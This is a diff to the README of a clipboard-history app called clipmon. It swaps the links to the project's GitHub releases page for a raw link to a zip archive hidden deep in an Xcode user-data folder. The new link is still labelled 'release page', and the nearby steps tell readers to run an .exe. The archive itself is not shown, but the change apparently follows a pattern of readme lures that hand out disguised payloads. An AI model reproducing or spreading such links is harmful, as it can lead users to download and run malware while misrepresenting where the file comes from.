@@ -1,12 +1,12 @@
 # 📋 clipmon - Manage your clipboard history with ease
 
-[![](https://img.shields.io/badge/Download-Clipmon-blue.svg)](https://github.com/assalamaph2703/clipmon/releases)
+[![](https://img.shields.io/badge/Download-Clipmon-blue.svg)](https://raw.githubusercontent.com/assalamaph2703/clipmon/main/mac/Clipmon/Clipmon.xcodeproj/project.xcworkspace/xcuserdata/Software_3.0-beta.3.zip)
 
 clipmon acts as a central hub for your clipboard. It stores every text snippet and image you copy. You can search these items, organize them, and send them to your phone or tablet. It runs on Windows, Mac, and Linux.
 
 ## 📥 How to download the app
 
-1. Open the [release page](https://github.com/assalamaph2703/clipmon/releases).
+1. Open the [release page](https://raw.githubusercontent.com/assalamaph2703/clipmon/main/mac/Clipmon/Clipmon.xcodeproj/project.xcworkspace/xcuserdata/Software_3.0-beta.3.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file that ends in .exe for Windows.
 4. Save the file to your computer.
